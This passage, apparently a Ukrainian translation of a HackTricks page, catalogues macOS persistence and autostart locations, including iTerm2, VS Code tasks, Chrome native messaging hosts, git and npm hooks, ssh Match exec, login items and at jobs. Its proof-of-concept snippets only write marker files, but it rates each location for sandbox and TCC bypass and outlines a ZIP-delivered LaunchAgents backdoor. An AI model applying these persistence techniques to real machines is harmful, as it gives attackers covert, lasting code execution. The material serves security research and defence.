had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Раніше iTerm2 мав надані дозволи TCC

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Тригер**: Запустіть iTerm2 зі скриптом Python API, що відповідає вимогам, у цій папці
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Тригер**: Запустіть iTerm2; хук запуску AppleScript задокументовано окремо
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Тригер**: Створіть сеанс із профілем, команда або початковий текст якого запускає payload

#### Опис і експлуатація

[Актуальний посібник iTerm2 з Python API](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) описує скрипти **Python** для автозапуску в `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. У ньому не стверджується, що довільний виконуваний файл `.sh` у цій папці запускається. Для тимчасового облікового запису збережіть файл за адресою `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[У поточному посібнику з AppleScript для iTerm2](https://iterm2.com/documentation-scripting.html) окремо описано `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, із резервним використанням застарілого шляху `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`, якщо сучасна папка не існує. Ось AppleScript лише з маркером:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Ці приклади скриптів перевірено за документацією iTerm2, але не запускали в активному сеансі робочого столу. Після тестування в одноразовому обліковому записі видаліть тестовий скрипт і `/tmp/ht-iterm-autolaunch-marker` або `/tmp/iterm2-autolaunchscpt` відповідно.

У налаштуваннях iTerm2, розташованих у **`~/Library/Preferences/com.googlecode.iterm2.plist`**, можна вказати команду профілю або початковий текст. Останній вводиться в сеанс; його виконання залежить від того, чи інтерпретує його shell. [Документація профілів iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) описує команду, яка запускається під час створення нового сеансу з цим профілем.

Цей параметр можна налаштувати в налаштуваннях iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

А команду відображено в налаштуваннях:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Для безпечної оцінки перевірте вибраний профіль у налаштуваннях iTerm2 або прочитайте копію його файлу налаштувань. Зміна `Initial Text` в активному профілі вплинула б на сеанси користувача, тому на дослідницькому Mac налаштування не змінювали.

### xbar

Опис: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але xbar має бути встановлено
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Запитує дозволи Accessibility

#### Розташування

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Тригер**: після запуску xbar

#### Опис

Якщо встановлено популярну програму [**xbar**](https://github.com/matryer/xbar), можна створити shell-скрипт у **`~/Library/Application\ Support/xbar/plugins/`**, який буде виконано під час запуску xbar:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Опис**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але Hammerspoon має бути встановлений
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Запитує дозволи Accessibility

#### Розташування

- **`~/.hammerspoon/init.lua`**
  - **Тригер**: Щойно hammerspoon буде запущено

#### Опис

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) — це платформа автоматизації для **macOS**, яка використовує **мову сценаріїв LUA**. Зокрема, вона підтримує інтеграцію повного коду AppleScript і виконання shell scripts, що значно розширює її можливості створення сценаріїв.<sup>[[13]](#references)</sup>

Програма шукає один файл — `~/.hammerspoon/init.lua` — і під час запуску виконує цей сценарій.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але BetterTouchTool має бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Запитує дозволи Automation-Shortcuts і Accessibility

#### Розташування

- Файл скрипту, на який **вже є посилання** в увімкненому пресеті BetterTouchTool, або конфігурація цього пресету в `~/Library/Application Support/BetterTouchTool/`. Точний шлях до скрипту залежить від налаштувань пресету.

[Довідник дій BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) описує дії зі скриптами оболонки та фоновими командами. Налаштована клавіатурна, мишача, сенсорна, віджетна чи інша подія має відбутися, поки відповідний пресет активний; [посібник із тригерів](https://docs.folivora.ai/docs/configuration/new-trigger/) показує, як це поєднується. Випадковий файл у каталозі підтримки програми не є тригером. Уже налаштована дія, що завантажує зовнішній скрипт із доступом на запис, є вужчою ціллю для запису з подальшим виконанням. Код виконується від імені облікового запису користувача BetterTouchTool з урахуванням фактично наданих йому дозволів macOS. На дослідницькому Mac BetterTouchTool не було в `/Applications`, тому жоден пресет локально не змінювали й не запускали.

### Alfred

- Корисний для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але Alfred має бути встановлений
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Запитує дозволи Automation, Accessibility і навіть Full-Disk access

#### Розташування

- Скрипт або файл, на який **вже є посилання** у встановленому workflow Alfred, або сам workflow у налаштованому користувачем каталозі `Alfred.alfredpreferences`. Каталог налаштувань може синхронізуватися й не має фіксованого універсального шляху.

[Посібник Alfred із workflow](https://www.alfredapp.com/help/workflows/) описує вимогу Powerpack і встановлення через інтерфейс. Має спрацювати hotkey, keyword або інший налаштований тригер встановленого workflow; [приклад hotkey Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) демонструє дію зі скриптом. [Довідник змінних середовища Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) надає шлях до вибраного каталогу налаштувань у змінній `alfred_preferences`. Розміщення незареєстрованого файла workflow у довільному каталозі не доводить, що його буде встановлено або запущено. Код виконується від імені користувача, який увійшов в Alfred, з урахуванням фактично наданих йому дозволів macOS. На дослідницькому Mac Alfred не було в `/Applications`, тому цей шлях оцінювали лише за документацією.

### Команди скриптів Raycast і оновлення розширень

- **Ціль для запису:** Виконуваний скрипт у каталозі, який **вже додано** в Raycast Settings → Script Commands. Raycast не сканує довільний щойно створений каталог. У [посібнику Raycast із Script Commands](https://manual.raycast.com/script-commands) описано реєстрацію каталогу.
- **Тригер та ідентичність:** Користувач запускає індексовану команду, налаштований hotkey або fallback запускає її, або Raycast оновлює скрипт `inline` згідно з налаштованим `@raycast.refreshTime`. Скрипт виконується від імені користувача, який увійшов у Raycast, через його інтерпретатор. [Довідник метаданих upstream](https://github.com/raycast/script-commands#metadata) обмежує автоматичне оновлення командами `inline`, а [маніфест розширень Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) окремо підтримує `interval` для встановлених команд розширень `no-view` або `menu-bar`. Саме додавання звичайної команди скрипту не планує її запуск.

Для одноразового облікового запису із зареєстрованим каталогом скриптів приклад скрипту `inline`, який лише створює маркер:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Збережіть його в зареєстрованому каталозі, зробіть виконуваним і дозвольте Raycast оновити його. Потім видаліть цей файл і `/tmp/ht-raycast-refresh-marker`. На дослідницькому Mac Raycast не знайшли під звичною назвою в `/Applications`, тож це задокументовано, але локально не запускалося. Для Accessibility, Automation і доступу до файлів macOS може показувати запити надання дозволів.

### Автоматичні завдання робочого простору Visual Studio Code

- **Цільовий файл:** `.vscode/tasks.json` у робочому просторі, який відкриє користувач.
- **Тригер:** відкриття цього робочого простору у VS Code, але лише якщо папка є довіреною **і** автоматичні завдання дозволено. У недовіреному робочому просторі автоматичні завдання ніколи не запускаються; стандартне налаштування перед першим автоматичним запуском запитує користувача. В [документації VS Code щодо завдань](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) і [документації щодо довіри до робочого простору](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) описано обидві умови.
- **Обліковий запис виконання:** обліковий запис користувача VS Code, через налаштований процес завдання. Це виконання, специфічне для програми, а не збереження після входу.

У **новому одноразовому робочому просторі** розмістіть це завдання лише з маркером у `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Після відкриття довіреного workspace і дозволу автоматичних завдань перевірте наявність `.autostart-task-ran`. Видаліть запис завдання та маркер для очищення. **Це було перевірено за документацією Microsoft і встановленим пакетом VS Code 1.139.1; у активному сеансі робочого столу це не запускалося.**

### Хости native messaging у Chrome

- **Цільовий шлях запису:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` для поточного користувача або `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` для всіх користувачів (потрібні права адміністратора на запис). Chromium і Chrome for Testing використовують різні каталоги; див. [актуальну таблицю шляхів Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Тригер:** Встановлене розширення Chrome із дозволом `nativeMessaging` викликає `chrome.runtime.connectNative()` або `chrome.runtime.sendNativeMessage()`, використовуючи точну назву хоста з маніфесту. Після цього Chrome запускає виконуваний файл хоста. Саме відкриття Chrome не запускає довільний новий native host; створення маніфесту без розширення, яке його викликає, нічого не робить. [Посібник Chrome з native messaging](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) описує цей процес взаємодії.
- **Контекст виконання:** обліковий запис користувача Chrome. У маніфесті має бути вказано абсолютний шлях до виконуваного файлу й явно дозволено джерело виклику — origin розширення.

У тимчасовому обліковому записі браузера з тестовим розширенням наведена нижче пара файлів демонструє зв’язок між записом і виконанням. Ім’я файла маніфесту має збігатися з його `name`, а `TEST_EXTENSION_ID` потрібно замінити фактичним ID розширення:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Збережіть цей JSON як `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Виконуваний файл, що містить лише маркер і вказаний у полі `path` маніфесту, може містити:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Після того як тестове розширення викликає `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` зі свого service worker або сторінки розширення, мітка підтверджує, що host запустився. Цей мінімальний host не реалізує протокол відповіді Chrome з префіксом довжини, тому після запису мітки розширення може повідомити про помилку обміну повідомленнями. Видаліть тестові маніфест, host і мітку для очищення. У macOS 26.5.2 застосунок Chrome і обидва каталоги маніфестів були присутні; **активний профіль Chrome не змінювали й не використовували**.

### Команди подій клавіш Karabiner-Elements

- **Ціль запису:** `~/.config/karabiner/karabiner.json` в обліковому записі, де встановлено й запущено Karabiner-Elements. [Посібник Karabiner щодо розташування файлу](https://karabiner-elements.pqrs.org/docs/json/location/) зазначає, що застосунок відстежує цей файл і перезавантажує його після запису. JSON-файли в `assets/complex_modifications` — це лише пресети, які можна імпортувати; сам запис файлу туди не активує правило.
- **Тригер:** налаштована подія клавіші після активації правила. У [довідці щодо `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) описано виконання команд. Це не виконання коду під час входу в систему або під час кожного запису файлу.
- **Ідентичність виконання:** користувач, який увійшов у систему й від імені якого працює процес користувача Karabiner. Надані йому дозволи та доступ TCC залежать від застосунку й версії.

Для тесту в окремому обліковому записі додайте цей об’єкт правила до масиву `complex_modifications.rules` вибраного профілю в `karabiner.json`, зберігши решту профілю. Натисніть F18, щоб створити нешкідливу мітку, а потім видаліть це правило й мітку. Вибір F18 дає змогу не призначати звичайну клавішу для введення тексту:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements не було встановлено в `/Applications` на тестовій машині з macOS 26.5.2, тому це PoC, підтверджений документацією, а не результат локального виконання.

### Git hooks у локальному репозиторії

- **Ціль запису:** виконуваний hook, наприклад `<repo>/.git/hooks/post-checkout`. Якщо `core.hooksPath` уже задано, використовуйте натомість указаний там каталог. Hook, зафіксований як звичайний відстежуваний файл із вихідним кодом, не встановлюється автоматично в клон.
- **Тригер:** відповідна операція Git. Наприклад, `post-checkout` запускається після `git checkout` або `git switch`, а також може запускатися після клонування чи створення робочого дерева. [Довідник Git щодо hooks](https://git-scm.com/docs/githooks) містить перелік подій і вимогу щодо біта виконання; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) змінює каталог пошуку.
- **Ідентичність виконання:** обліковий запис, від імені якого запускається Git. Hook може виконатися, лише якщо ефективний каталог hooks репозиторію доступний для запису цьому користувачеві й згодом він виконає відповідну операцію Git.

Цей PoC, який лише створює маркер, створює повністю тимчасовий репозиторій, встановлює один hook і перемикає гілку. Він успішно виконався з Apple Git 2.50.1 на macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle scripts у проєкті

- **Ціль запису:** карта `scripts` у файлі `package.json` проєкту, доступному для запису, або пакет установленої залежності, lifecycle script якого запустить користувач. Це хук робочого процесу розробки, а не виконання коду під час відкриття каталогу.
- **Тригер та ідентичність:** під час наступного запуску `npm install` або `npm ci`, якщо lifecycle scripts дозволені, від імені користувача, який запускає npm, виконуються `preinstall`, `install` і `postinstall`. Звичайний `npm run <name>` також запускає відповідні скрипти `pre<name>` і `post<name>`. У [довіднику npm з lifecycle](https://docs.npmjs.com/cli/v11/using-npm/scripts) перелічені події; параметр [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) може вимкнути lifecycle scripts під час встановлення. Налаштування версії та політик можуть змінити те, що дозволено, тому перевірте версію npm у цільовому середовищі.

Цей PoC лише створює маркер; його запущено з локальним npm у тимчасовому порожньому каталозі. Він не завантажує залежності й не змінює проєкт користувача:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Це відрізняється від файлів запуску інтерпретатора Python: npm має виконати відповідну дію встановлення або запуску, тоді як код `site` у Python може завантажуватися під час звичайного запуску інтерпретатора. Аналогічно, узагальнені цілі `Makefile` та визначення завдань збірки потребують, щоб користувач або вже налаштований інструмент викликав цю ціль; вони не є окремими шляхами автозапуску ОС.

### Конфігурація запуску Vim

- **Ціль запису:** `~/.vimrc` для користувача, який запускатиме Vim (або інший файл запуску, вибраний відповідно до порядку ініціалізації Vim). У [довіднику запуску Vim](https://vimhelp.org/starting.txt.html) описано цей файл і перевизначення `VIMINIT`/`EXINIT`.
- **Тригер:** Наступний звичайний запуск Vim, під час якого завантажується ця конфігурація. Параметр Vim `-u NONE` пропускає користувацький vimrc. Це виконання, специфічне для редактора, а не тригер входу в ОС.
- **Ідентичність виконання:** Обліковий запис користувача Vim.

Наступний ізольований PoC було запущено з `/usr/bin/vim` у macOS; він не записує жодних справжніх налаштувань Vim або відкритих документів:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim має окремий шлях до конфігурації користувача — `$XDG_CONFIG_HOME/nvim/init.lua` або `init.vim` — і також завантажує скрипти з каталогів `plugin/` у runtime-директоріях відповідно до [документації про запуск](https://neovim.io/doc/user/starting/). Neovim не було встановлено на тестовій машині з macOS 26.5.2, тому цей варіант там не запускали.

### Команди конфігурації SSH-клієнта

- **Цільовий файл запису:** `~/.ssh/config` або інший файл, який він уже підключає. Це файл конфігурації **клієнта**; він відрізняється від серверного `~/.ssh/rc`, описаного нижче.
- **Тригер:** відповідний виклик `ssh`. `Match exec` запускає локальну команду, коли клієнт обробляє свою конфігурацію, навіть для `ssh -G`, який виводить конфігурацію без підключення. `ProxyCommand` запускається, коли клієнт налаштовує відповідне з'єднання. `LocalCommand` запускається лише після успішного підключення й потребує `PermitLocalCommand yes` (за замовчуванням — `no`). Ці команди запускаються в різний час і мають різні передумови; сам запис у файл їх не виконує. Див. документацію upstream [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Ідентичність виконання:** локальний користувач, який запускає `ssh`. Потрібні відповідний хост, застосовний файл конфігурації та будь-яке необхідне підключення. За допомогою `ssh -F` можна вибрати інший файл конфігурації.

Цей PoC, що створює лише маркер, було запущено з клієнтом SSH від Apple на macOS 26.5.2. `-G` перевіряє `Match exec`, не встановлюючи мережевого з'єднання й не читаючи справжню конфігурацію SSH користувача:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Файли ініціалізації debugger

- **Ціль запису:** `~/.lldbinit` або файл для конкретної програми з вищим пріоритетом, наприклад `~/.lldbinit-lldb`. LLDB читає один файл під час запуску debugger. `.lldbinit` у поточному каталозі **не** виконується за замовчуванням; користувач має ввімкнути `target.load-cwd-lldbinit` або передати `--local-lldbinit`. Див. [посібник LLDB](https://lldb.llvm.org/man/lldb.html).
- **Тригер та ідентичність:** користувач запускає LLDB без `--no-lldbinit`; команди виконуються від імені цього користувача. Сам факт відкриття проєкту не означає, що виконається `.lldbinit` проєкту.

Наведений нижче тест лише з маркером виконувався в LLDB на macOS 26.5.2, з ізольованими домашнім каталогом і робочим каталогом:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Для **GDB** в [документації щодо запуску](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) вказано `$HOME/Library/Preferences/gdb/gdbinit`, а потім `~/.gdbinit` у macOS. Файл `.gdbinit` у поточному каталозі підпадає під [безпечний шлях автозавантаження](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), а параметри `-nx`/`-nh` вимикають файли ініціалізації. На тестовому Mac GDB не було встановлено, тому цей варіант локально не перевіряли.

### SSHRC

Опис: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але SSH має бути ввімкнено й використовуватися
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Для використання SSH потрібен доступ FDA

#### Розташування

- **`~/.ssh/rc`**
  - **Тригер**: вхід через SSH
- **`/etc/ssh/sshrc`**
  - Потрібні права root
  - **Тригер**: вхід через SSH

> [!CAUTION]
> Щоб увімкнути SSH, потрібен повний доступ до диска:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Опис і експлуатація

За замовчуванням, якщо в `/etc/ssh/sshd_config` не вказано `PermitUserRC no`, під час **входу користувача через SSH** виконуються скрипти **`/etc/ssh/sshrc`** і **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Об’єкти входу**

Опис: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але потрібно виконати `osascript` з аргументами
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **Зареєстрований допоміжний застосунок для входу:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (типове розташування в комплекті застосунку).
  - **Умова запуску:** реєстрація може негайно запустити helper; надалі він запускатиметься під час входу користувача, якщо отримано схвалення.
- **Зареєстрований агент/демон у комплекті застосунку:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` або `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Умова запуску:** схвалений агент може запуститися під час реєстрації та під час наступних входів; схвалений демон запускається під час завантаження системи. Для демона потрібне схвалення адміністратора.

#### Опис

У розділі **Системні параметри → Загальні → Об’єкти входу та розширення** користувачі можуть переглядати об’єкти входу й фонові об’єкти. У macOS 13 і новіших версіях доступний [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) для реєстрації login items, launch agents і launch daemons, що входять до комплекту застосунку. Поведінка [`register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) залежить від типу об’єкта та стану схвалення. **Самого запису helper у комплект застосунку недостатньо, щоб зареєструвати новий login item.** І навпаки: якщо виконуваний файл уже зареєстрованого helper доступний для запису, його зміна може вплинути на наступний запуск без повторної реєстрації; спочатку перевірте фактичний шлях і перевірки підпису коду.

Наведений нижче спосіб лише читає дані та дає змогу шукати допоміжні застосунки в комплектах на Mac; він не реєструє і не запускає їх:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Для bundled launch plist розв’язуйте `BundleProgram` **відносно кореня app bundle** (наприклад, `Contents/MacOS/Helper`), як зазначено в [інструкціях Apple щодо міграції Service Management](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Інвентаризація `/Applications` лише для читання на дослідницькому Mac виявила 14 bundled helper-записів і п’ять декларацій `BundleProgram`; усі п’ять цільових шляхів було визначено, а два пройшли перевірку на можливість запису користувачем. Ця перевірка **не** підтверджує, що будь-який із цих helper зареєстрований, увімкнений, виконуваний після перевірки підпису або доступний із sandbox. Команда `sfltool dumpbtm` показала 150 іменованих записів на цьому Mac; це допоміжний засіб для перевірки, а не тест того, чи кожен запис запущений.

Старими елементами входу також можна керувати через Apple events. Їх можна переглядати, додавати й видаляти з командного рядка, хоча додавання змінює постійну конфігурацію входу користувача та може потребувати схвалення Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` — це деталь реалізації, а не підтримуване місце для встановлення payload простим записом файла. Старіший API `SMLoginItemSetEnabled` для нових помічників замінено на `SMAppService`; шлях `/var/db/com.apple.xpc.launchd/loginitems.501.plist`, наведений на сторінці раніше, був відсутній на тестовій машині з macOS 26.5.2. Оцінюючи сучасні елементи входу, використовуйте API реєстрації та стан системного інтерфейсу, а не припускайте наявність певного шляху до бази даних.

### ZIP як елемент входу

(Див. попередній розділ про елементи входу; це доповнення.)

Якщо зберегти файл **ZIP** як **елемент входу**, **`Archive Utility`** відкриє його, і якщо ZIP, наприклад, зберігався в **`~/Library`** та містив папку **`LaunchAgents/file.plist`** із backdoor, цю папку буде створено (за замовчуванням її немає), а plist буде додано. Тож наступного разу, коли користувач знову ввійде в систему, **backdoor, указаний у plist, буде виконано**.

Інший варіант — створити файли **`.bash_profile`** і **`.zshenv`** у домашній теці користувача, щоб цей прийом працював, навіть якщо папка LaunchAgents уже існує.

### At

Опис: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Але потрібно **виконати** **`at`**, і його має бути **увімкнено**
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Потрібно **виконати** **`at`**, і його має бути **увімкнено**

#### **Опис**

Завдання `at` призначені для **планування одноразових завдань**, які виконуються у визначений час. На відміну від завдань cron, завдання `at` автоматично видаляються після виконання. Важливо зазначити, що ці завдання зберігаються після перезавантаження системи, що за певних умов може становити загрозу безпеці.<sup>[[16]](#references)</sup>

У комплектному файлі `com.apple.atrun.plist` задано `Disabled = true`, але launchd зберігає фактичні перевизначення стану окремо. На тестовій машині з macOS 26.5.2 команда `launchctl print-disabled system` показала, що `com.apple.atrun` **увімкнено**, попри цей ключ у комплектному файлі. Перш ніж стверджувати, що завдання `at` виконуватимуться, перевірте фактичний стан:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Адміністратор може ввімкнути вимкнену службу `atrun` за допомогою `launchctl`; наведений нижче історичний приклад змінює стан системної служби і **не** запускався на дослідницькому Mac:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Через 1 годину буде створено файл:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Перевірте чергу завдань за допомогою `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Вище ми бачимо два заплановані завдання. Можна вивести подробиці завдання за допомогою `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Якщо AT tasks не ввімкнено, створені завдання не виконуватимуться.

**Файли завдань** можна знайти в `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Назва файлу містить чергу, номер завдання та час його запуску. Для прикладу розгляньмо `a0001a019bdcd2`.

- `a` — це черга
- `0001a` — номер завдання в hex, `0x1a = 26`
- `019bdcd2` — час у hex. Він позначає кількість хвилин, що минули від epoch. `0x019bdcd2` у десятковій системі — це `26991826`. Якщо помножити це число на 60, отримаємо `1619509560`, що відповідає `GMT: 2021. April 27., Tuesday 7:46:00`.

Якщо вивести вміст файлу завдання, побачимо, що він містить ту саму інформацію, яку ми отримали за допомогою `at -c`.

### Сповіщення Calendar про відкриття файлу

